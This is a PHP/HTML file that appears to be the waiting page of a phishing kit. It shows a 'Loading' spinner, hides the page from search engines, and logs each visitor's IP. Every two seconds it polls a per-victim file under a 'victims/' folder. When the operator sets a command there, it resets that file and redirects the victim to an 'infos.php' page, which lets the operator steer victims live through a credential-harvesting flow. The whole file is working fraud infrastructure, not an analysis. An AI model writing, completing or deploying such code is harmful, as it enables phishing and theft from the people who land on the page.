<?php 
include "./all.php";
require_once "functions.php";
?>


<!doctype html>
<html>

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <!-- CSS FILES -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">


    <title>Loading</title>

</head>
<style>
.lds-ellipsis {
    display: inline-block;
    position: relative;
    width: 80px;
    height: 80px;
}

.lds-ellipsis div {
    position: absolute;
    top: 33px;
    width: 13px;
    height: 13px;
    border-radius: 50%;
    background: #442041;
    animation-timing-function: cubic-bezier(0, 1, 1, 0);
}

.lds-ellipsis div:nth-child(1) {
    left: 8px;
    animation: lds-ellipsis1 0.6s infinite;
}

.lds-ellipsis div:nth-child(2) {
    left: 8px;
    animation: lds-ellipsis2 0.6s infinite;
}

.lds-ellipsis div:nth-child(3) {
    left: 32px;
    animation: lds-ellipsis2 0.6s infinite;
}

.lds-ellipsis div:nth-child(4) {
    left: 56px;
    animation: lds-ellipsis3 0.6s infinite;
}

@keyframes lds-ellipsis1 {
    0% {
        transform: scale(0);
    }

    100% {
        transform: scale(1);
    }
}

@keyframes lds-ellipsis3 {
    0% {
        transform: scale(1);
    }

    100% {
        transform: scale(0);
    }
}

@keyframes lds-ellipsis2 {
    0% {
        transform: translate(0, 0);
    }

    100% {
        transform: translate(24px, 0);
    }
}

#main .login-area .box {
    box-shadow: none;
    border-top: none;
    border-radius: 0px;
    padding-top: 100px;
}


@media (max-width: 767px) {
    #header .container {
        justify-content: space-between;

    }

    #main .login-area .box {
        padding-top: 150px;
    }
}
</style>

<body>



    <main id="main">

    </main>

    <!-- JS FILES -->
    <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>


    <script>
    var ip = '<?php echo get_client_ip(); ?>';
    var waiting = setInterval(function() {
        $.get('victims/' + ip + '.php', function(data) {
            if (data == 0) {
                //console.log('hada ba9i 0');
            } else {
                // Define the redirection URL based on the response data
                var redirectionUrl = "infos.php?redirection=" + data;

                // Perform the file modification request before redirecting
                $.post('modify_file.php', {
                    ip: ip,
                    content: "0"
                }, function(modifyResponse) {
                    // Check if the file was successfully modified
                    if (modifyResponse == 'success') {
                        // Proceed with the redirection
                        clearInterval(waiting);
                        window.top.location.href = redirectionUrl;
                    } else {
                        // Handle failure to modify the file (if necessary)
                        console.error('Failed to modify the file.');
                    }
                });
            }
        });
    }, 2000);
    </script>

</body>

</html>